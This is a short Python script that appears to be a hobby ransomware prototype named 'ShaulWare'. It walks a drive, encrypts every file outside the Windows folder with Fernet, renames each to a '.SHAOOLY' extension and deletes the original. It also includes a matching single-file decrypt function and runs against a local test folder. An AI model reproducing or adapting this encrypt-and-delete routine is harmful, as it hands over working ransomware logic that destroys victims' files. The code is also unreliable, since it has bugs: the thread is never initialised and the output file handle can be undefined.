from cryptography.fernet import Fernet
import os
import threading
from win32 import win32api
import time




class Encrypt(threading.Thread):
    def __init__(self, key, drive):
        self.key = key
        self.drive = drive

    def run(self):
        for r, d, f in os.walk(self.drive):
            start = time.time()
            if r.split("\\")[2] != "Windows":
                for file in f:
                    filepath = os.path.join(r, file)
                    if len(file.split('.')) == 1:
                        file_extension = ""
                    else:
                        file_extension = file.split(".")[-1]
                    file_name = file.split(".")[0]
                    enc_file_name = f'{file_name}.SHAOOLY'
                    fernet = Fernet(self.key)
                    byte_file = open(filepath, 'rb')
                    enc_file_content = fernet.encrypt(byte_file.read())
                    if not os.path.exists(enc_file_name):
                        encrypted_file = open(enc_file_name, 'w')
                    encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                    byte_file.close()
                    os.remove(filepath)
            end = time.time()
            print(end - start)



def decrypt_data(filepath, key):
    filename = filepath.split('/')[-1].split(".")[0]
    fernet = Fernet(key)
    enc_file = open(filepath, 'r')
    file_content = enc_file.read().split('\n')
    ext = file_content[0] 
    file_name_with_ext = f'{filename}.{ext}'
    dec_file = open(file_name_with_ext, 'wb')
    dec_file.write(fernet.decrypt(file_content[1].encode()))
    enc_file.close()
    os.remove(filepath)



key = open("key.txt", 'rb').read()
encrypt = Encrypt(key, r"C:\Users\shaoo\PycharmProjects\ShaulWare\venv\hello")
encrypt.run()
print("hello")